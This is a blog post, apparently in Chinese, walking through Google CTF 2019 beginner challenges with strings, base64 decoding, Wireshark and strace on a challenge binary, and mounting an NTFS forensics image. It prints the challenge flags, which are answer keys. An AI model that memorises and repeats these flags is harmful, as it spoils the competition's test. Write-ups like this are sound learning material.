

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="gscr10">
  <meta name="keywords" content="">
  <title>goolge ctf 2019 stage1 writeup_part_1 - ri0-__Hack the World</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/ocean.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Mr. Military</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://w.wallhaven.cc/full/2e/wallhaven-2em38y.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2019-10-02 12:13" pubdate>
        October 2, 2019 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      66
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">goolge ctf 2019 stage1 writeup_part_1</h1>
            
            <div class="markdown-body" id="post-body">
              <h2 id="01-Enter-Space-Time-Coordinates-misc"><a href="#01-Enter-Space-Time-Coordinates-misc" class="headerlink" title="01 Enter Space-Time Coordinates(misc)"></a>01 Enter Space-Time Coordinates(misc)</h2><ul>
<li>下载zip压缩包解压，得到log.txt and rand2，进行查看</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜ attachment cat log.txt</span><br><span class="line"></span><br><span class="line">0: AC+79 3888&#123;6652492084280_198129318435598&#125;</span><br><span class="line">1: Pliamas Sos&#123;276116074108949_243544040631356&#125;</span><br><span class="line">2: Ophiuchus&#123;11230026071572_273089684340955&#125;</span><br><span class="line">3: Pax Memor -ne4456 Hi Pro&#123;21455190336714_219250247519817&#125;</span><br><span class="line">4: Camion Gyrin&#123;235962764372832_269519420054142&#125;</span><br><span class="line"></span><br><span class="line">➜ attachment file rand2</span><br><span class="line"></span><br><span class="line">rand2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=0208fc60863053462fb733436cef1ed23cb6c78f, not stripped</span><br></pre></td></tr></table></figure>

<ul>
<li>执行rand2</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ attachment ./rand2</span><br><span class="line"></span><br><span class="line">Travel coordinator</span><br><span class="line">0: AC+79 3888 - 95603467253307, 47507421386467</span><br><span class="line">1: Pliamas Sos - 192115414361300, 250197841279970</span><br><span class="line">2: Ophiuchus - 51512207753664, 34661227854198</span><br><span class="line">3: Pax Memor -ne4456 Hi Pro - 235082830098621, 202860065631117</span><br><span class="line">4: Camion Gyrin - 66299664563594, 223065406793793 </span><br><span class="line">5: CTF - &lt;REDACTED&gt;</span><br><span class="line"></span><br><span class="line">Enter your destination<span class="string">&#x27;s x coordinate:</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>看到 CTF - REDACTED，log里面也没有坐标信息，尝试利用strings命令查看源码并搜索CTF</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ attachment strings ./rand2 | grep CTF</span><br><span class="line"></span><br><span class="line">Arrived at the flag. Congrats, your flag is: CTF&#123;welcome_to_googlectf&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>==<strong>flag：CTF{welcome_to_googlectf}</strong>==</li>
</ul>
<h2 id="02-Satellite-networking"><a href="#02-Satellite-networking" class="headerlink" title="02 Satellite(networking)"></a>02 Satellite(networking)</h2><ul>
<li>下载压缩包解压得到：init_sat、readme.pdf</li>
<li>查看redeme.pdf,获取图片中“osmium”</li>
<li>查看init_sat文件类型</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite file init_sat</span><br><span class="line"></span><br><span class="line">init_sat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, not stripped</span><br></pre></td></tr></table></figure>

<ul>
<li>执行init_sat,并输入“osmium”,按照指示得到</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite ./init_sat</span><br><span class="line"></span><br><span class="line">Hello Operator. Ready to connect to a satellite?</span><br><span class="line">Enter the name of the satellite to connect to or <span class="string">&#x27;exit&#x27;</span> to quit</span><br><span class="line">osimum</span><br><span class="line">Unrecognized satellite: osimum</span><br><span class="line"></span><br><span class="line">Enter the name of the satellite to connect to or <span class="string">&#x27;exit&#x27;</span> to quit</span><br><span class="line">osmium</span><br><span class="line">Establishing secure connection to osmium</span><br><span class="line"> satellite...</span><br><span class="line">Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Username: brewtoot password: ********************       166.00 IS-19 2019/05/09 00:00:00Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        Daily acquisition capacity: 220,000km²  Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E</span><br></pre></td></tr></table></figure>

<ul>
<li>可以察觉password：**<strong><strong>**</strong></strong>，有可能是flag。最后给的网址也许同样有线索</li>
<li>打开网址得到一字符串，观察可是应为base64加密</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==</span><br></pre></td></tr></table></figure>

<ul>
<li>对字符串进行解码。并没有得到flag</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite <span class="built_in">echo</span> <span class="string">&#x27;VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==&#x27;</span>| base64 -d</span><br><span class="line"></span><br><span class="line">Username: wireshark-rocks</span><br><span class="line">Password: start-sniffing!</span><br></pre></td></tr></table></figure>

<ul>
<li>方法一：根据提示，利用wireshark可以截获password明文</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000   00 0c 29 e9 77 9f 00 50 56 fd 49 f6 08 00 45 00   ..)éw..PVýIö..E.</span><br><span class="line">0010   01 93 02 05 00 00 80 06 9e cc 22 4c 65 1d c0 a8   .........Ì&quot;Le.À¨</span><br><span class="line">0020   50 82 05 39 e5 9e 28 e0 1a 57 cb 95 5d b1 50 18   P..9å.(à.WË.]±P.</span><br><span class="line">0030   fa f0 3a 91 00 00 55 73 65 72 6e 61 6d 65 3a 20   úð:...Username: </span><br><span class="line">0040   62 72 65 77 74 6f 6f 74 20 70 61 73 73 77 6f 72   brewtoot passwor</span><br><span class="line">0050   64 3a 20 43 54 46 7b 34 65 66 63 63 37 32 30 39   d: CTF&#123;4efcc7209</span><br><span class="line">0060   30 61 66 32 38 66 64 33 33 61 32 31 31 38 39 38   0af28fd33a211898</span><br><span class="line">0070   35 35 34 31 66 39 32 65 37 39 33 34 37 37 66 7d   5541f92e793477f&#125;</span><br><span class="line">0080   09 31 36 36 2e 30 30 20 49 53 2d 31 39 20 32 30   .166.00 IS-19 20</span><br><span class="line">0090   31 39 2f 30 35 2f 30 39 20 30 30 3a 30 30 3a 30   19/05/09 00:00:0</span><br><span class="line">00a0   30 09 53 77 61 74 68 20 36 34 30 6b 6d 09 52 65   0.Swath 640km.Re</span><br><span class="line">00b0   76 69 73 69 74 20 63 61 70 61 63 69 74 79 20 74   visit capacity t</span><br><span class="line">00c0   77 69 63 65 20 64 61 69 6c 79 2c 20 61 6e 79 77   wice daily, anyw</span><br><span class="line">00d0   68 65 72 65 20 52 65 73 6f 6c 75 74 69 6f 6e 20   here Resolution </span><br><span class="line">00e0   70 61 6e 63 68 72 6f 6d 61 74 69 63 3a 20 33 30   panchromatic: 30</span><br><span class="line">00f0   63 6d 20 6d 75 6c 74 69 73 70 65 63 74 72 61 6c   cm multispectral</span><br><span class="line">0100   3a 20 31 2e 32 6d 09 44 61 69 6c 79 20 61 63 71   : 1.2m.Daily acq</span><br><span class="line">0110   75 69 73 69 74 69 6f 6e 20 63 61 70 61 63 69 74   uisition capacit</span><br><span class="line">0120   79 3a 20 32 32 30 2c 30 30 30 6b 6d c2 b2 09 52   y: 220,000kmÂ².R</span><br><span class="line">0130   65 6d 61 69 6e 69 6e 67 20 63 6f 6e 66 69 67 20   emaining config</span><br><span class="line">0140   64 61 74 61 20 77 72 69 74 74 65 6e 20 74 6f 3a   data written to:</span><br><span class="line">0150   20 68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 67 6f    https://docs.go</span><br><span class="line">0160   6f 67 6c 65 2e 63 6f 6d 2f 64 6f 63 75 6d 65 6e   ogle.com/documen</span><br><span class="line">0170   74 2f 64 2f 31 34 65 59 50 6c 75 44 5f 70 69 33   t/d/14eYPluD_pi3</span><br><span class="line">0180   38 32 34 47 41 46 61 6e 53 32 39 74 57 64 54 63   824GAFanS29tWdTc</span><br><span class="line">0190   4b 78 50 5f 58 55 78 78 37 65 33 30 33 2d 33 45   KxP_XUxx7e303-3E</span><br><span class="line">01a0   0a                                                .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>方法二：思路转向password的明文。直接通过文本工具打开init_sat源码并不能查看到flag信息。尝试通过strace进行调试。</li>
<li>f 显示产生的子进程</li>
<li>s 需要显示的字符串长度</li>
<li>e 定位的参数，recv\read\write …</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite strace -f -s 12345 -e trace=recv,<span class="built_in">read</span> ./init_sat</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0000b\0\0\0\0\0\0@\0\0\0\0\0\0\0P,\2\0\0\0\0\0\0\0\0\0@\0008\0\t\0@\0(\0&#x27;\0\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0\370\1\0\0\0\0\0\0\370\1\0\0\0\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\4\0\0\0PM\1\0\0\0\0\0PM\1\0\0\0\0\0PM\1\0\0\0\0\0\34\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\223\1\0\0\0\0\0\20\223\1\0\0\0\0\0\0\0 \0\0\0\0\0\1\0\0\0\6\0\0\0\240\233\1\0\0\0\0\0\240\233!\0\0\0\0\0\240\233!\0\0\0\0\0P\7\0\0\0\0\0\0\340H\0\0\0\0\0\0\0\0 \0\0\0\0\0\2\0\0\0\6\0\0\0h\235\1\0\0\0\0\0h\235!\0\0\0\0\0h\235!\0\0\0\0\0000\2\0\0\0\0\0\0000\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0008\2\0\0\0\0\0\0008\2\0\0\0\0\0\0008\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0P\345td\4\0\0\0pM\1\0\0\0\0\0pM\1\0\0\0\0\0pM\1\0\0\0\0\0\344\10\0\0\0\0\0\0\344\10\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0\240\233\1\0\0\0\0\0\240\233!\0\0\0\0\0\240\233!\0\0\0\0\0`\4\0\0\0\0\0\0`\4\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0(\306\252\336p\262\324\r\37\17=\n\32\f\255\32\270\26D\217\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\345\1\0\0[\0\0\0 \0\0\0\v\0\0\0\31#\2\261\1\10\20\2@@a\370\3\10\10\25\200 \0\0\0\0\200\300\321Q\0\0\0\22\353\3020D\0\10\20A\0\2\0\2\f\1\200\v\221\1\330\240\r\240@\230 \244\200\21\n\202-l@g\214V\24\0\224 \200<span class="variable">$H</span>\200P(\1\22\f\311B\240\220\22\10\f \2ZdA\245c\4@\n\n\n\0\2009\1(\314D\204\201\300\22\10(\fD\0\0\0\200Q\10\200\35\4B\320\2608A\0\1\0\0\265\0300\0\200`\2\20\&quot;\0\tA\20\1\5\0P(\251\22G(\0\0\202\4\230@\4\0\20\340T\0\2@\2\2\20\3010f\26\200\0&quot;</span>, 832) = 832</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\260\34\2\0\0\0\0\0@\0\0\0\0\0\0\0\220\351\36\0\0\0\0\0\0\0\0\0@\0008\0\n\0@\0I\0H\0\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0000\2\0\0\0\0\0\0000\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\4\0\0\0P\335\33\0\0\0\0\0P\335\33\0\0\0\0\0P\335\33\0\0\0\0\0\34\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240j\36\0\0\0\0\0\240j\36\0\0\0\0\0\0\0 \0\0\0\0\0\1\0\0\0\6\0\0\0 v\36\0\0\0\0\0 v&gt;\0\0\0\0\0 v&gt;\0\0\0\0\0@R\0\0\0\0\0\0\300\224\0\0\0\0\0\0\0\0 \0\0\0\0\0\2\0\0\0\6\0\0\0\200\253\36\0\0\0\0\0\200\253&gt;\0\0\0\0\0\200\253&gt;\0\0\0\0\0\340\1\0\0\0\0\0\0\340\1\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0p\2\0\0\0\0\0\0p\2\0\0\0\0\0\0p\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0\7\0\0\0\4\0\0\0 v\36\0\0\0\0\0 v&gt;\0\0\0\0\0 v&gt;\0\0\0\0\0\20\0\0\0\0\0\0\0\220\0\0\0\0\0\0\0\10\0\0\0\0\0\0\0P\345td\4\0\0\0l\335\33\0\0\0\0\0l\335\33\0\0\0\0\0l\335\33\0\0\0\0\0\334Y\0\0\0\0\0\0\334Y\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0 v\36\0\0\0\0\0 v&gt;\0\0\0\0\0 v&gt;\0\0\0\0\0\3409\0\0\0\0\0\0\3409\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\264\27\300\272|\305\317\6\321\321\276\326e,\355\271%&lt;`\320\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\363\3\0\0\n\0\0\0\0\1\0\0\16\0\0\0\0000\20D\240 \2\1\210\3\346\220\305E\214\0\304\0X\0\7\204\0p\302\200\0\r\212\fA\4\20\0\210@2\10*@\210T&lt;- \0162H&amp;\204\300\214\4\10\0\2\2\16\241\254\32\6f\310\0\3002\0\300\4P\t \201\10\204\v  ($\0\4 Z\0\20X\200\312DB(\0\6\200\0208C\0 @\200\0IP\0Q\212@\22\0\0\0\0\10\0\0\21\20&quot;</span>, 832) = 832</span><br><span class="line">strace: Process 188 attached</span><br><span class="line">strace: Process 189 attached</span><br><span class="line">strace: Process 190 attached</span><br><span class="line">strace: Process 191 attached</span><br><span class="line">strace: Process 192 attached</span><br><span class="line">Hello Operator. Ready to connect to a satellite?</span><br><span class="line">Enter the name of the satellite to connect to or <span class="string">&#x27;exit&#x27;</span> to quit</span><br><span class="line">[pid   187] <span class="built_in">read</span>(0, osmium</span><br><span class="line"><span class="string">&quot;osmium\n&quot;</span>, 4096)   = 7</span><br><span class="line">Establishing secure connection to osmium</span><br><span class="line"> satellite...</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference&#x27; and `info&#x27; packages installed, try:\n# `info libc \&quot;Name Service Switch\&quot;&#x27; for information about this file.\n\npasswd:         compat systemd\ngroup:          compat systemd\nshadow:         compat\ngshadow:        files\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n&quot;</span>, 1024) = 513</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 1024)           = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;# This file was automatically generated by WSL. To stop automatic generation of this file, remove this line.\nnameserver 172.16.23.168\nnameserver 172.16.23.131\nnameserver fec0:0:0:ffff::1\n&quot;</span>, 65536) = 187</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65349)          = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65536)          = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;# This file is automatically generated by WSL based on the Windows hosts file:\n# %WINDIR%\\System32\\drivers\\etc\\hosts. Modifications to this file will be overwritten.\n127.0.0.1\tlocalhost\n127.0.1.1\tDESKTOP-ARC2CM5.localdomain\tDESKTOP-ARC2CM5\n127.0.0.1\twww.xmind.com\n127.0.0.1\txmind.com\n127.0.0.1\twww.xmind.net\n127.0.0.1\txmind.net\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n&quot;</span>, 65536) = 512 [pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65024)          = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65536)          = 0</span><br><span class="line">strace: Process 193 attached</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, 0xc000126000, 512)  = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   191] <span class="built_in">read</span>(5, 0xc000128000, 512)  = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;cJ\201\200\0\1\0\0\0\1\0\0\tsatellite\16ctfcompetition\3com\0\0\34\0\1\300\26\0\6\0\1\0\0\1,\0N\vns-cloud-b1\rgoogledomains\300%\24cloud-dns-hostmaster\6google\300%\0\0\0\1\0\0T`\0\0\16\20\0\3\364\200\0\0\1,&quot;</span>, 512) = 136</span><br><span class="line">[pid   193] <span class="built_in">read</span>(5, <span class="string">&quot;\321w\201\200\0\1\0\1\0\0\0\0\tsatellite\16ctfcompetition\3com\0\0\1\0\1\300\f\0\1\0\1\0\0\0&lt;\0\4\&quot;Le\35&quot;</span>, 512) = 62</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, 0xc00013e000, 4096) = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect\n\n&quot;</span>, 4096) = 87</span><br><span class="line">Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect</span><br><span class="line"></span><br><span class="line">[pid   187] <span class="built_in">read</span>(0, a</span><br><span class="line"><span class="string">&quot;a\n&quot;</span>, 4096)        = 2</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, 0xc000163000, 4096) = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   193] <span class="built_in">read</span>(3, <span class="string">&quot;Username: brewtoot password: CTF&#123;4efcc72090af28fd33a2118985541f92e793477f&#125;\t166.00 IS-19 2019/05/09 00:00:00\tSwath 640km\tRevisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m\tDaily acquisition capacity: 220,000km\302\262\tRemaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E\n&quot;</span>, 4096) = 363</span><br><span class="line">Username: brewtoot password: ********************     166.00 IS-19 2019/05/09 00:00:00                            Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m          Daily acquisition capacity: 220,000km²   Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E</span><br><span class="line"></span><br><span class="line">[pid   193] <span class="built_in">read</span>(0,</span><br></pre></td></tr></table></figure>

<ul>
<li>pid 193进程read中，password明文显示flag</li>
<li>==<strong>flag：CTF{4efcc72090af28fd33a2118985541f92e793477f}</strong>==</li>
</ul>
<h2 id="03-home-computer-forensics"><a href="#03-home-computer-forensics" class="headerlink" title="03 home computer(forensics)"></a>03 home computer(forensics)</h2><ul>
<li><p>forensics:取证</p>
</li>
<li><p>解压得到 note.txt、 family.ntfs</p>
</li>
<li><p>加载family.ntfs有两种方法：</p>
</li>
<li><p>方法一：7.zip<br>（支援的檔案格式：压缩／解压缩：7z、XZ、BZIP2、GZIP、TAR、ZIP 及 WIM//解压缩：AR、ARJ、CAB、CHM、CPIO、CramFS、DMG、EXT、FAT、GPT、HFS、IHEX、ISO、LZH、LZMA、MBR、MSI、NSIS、NTFS、QCOW2、RAR、RPM、SquashFS、UDF、UEFI、VDI、VHD、VMDK、WIM、XAR 及 Z)</p>
</li>
<li><p>方法二：linux 挂载(kali)</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 mount -t ntfs ./family.ntfs /mnt</span><br></pre></td></tr></table></figure>

<ul>
<li>进入路径：/mnt/Users/Family/Documents ，查看credentials.txt</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 cat credentials.txt</span><br><span class="line"></span><br><span class="line">I keep pictures of my credentials <span class="keyword">in</span> extended attributes.</span><br></pre></td></tr></table></figure>

<ul>
<li>利用attr查看扩展文件</li>
</ul>
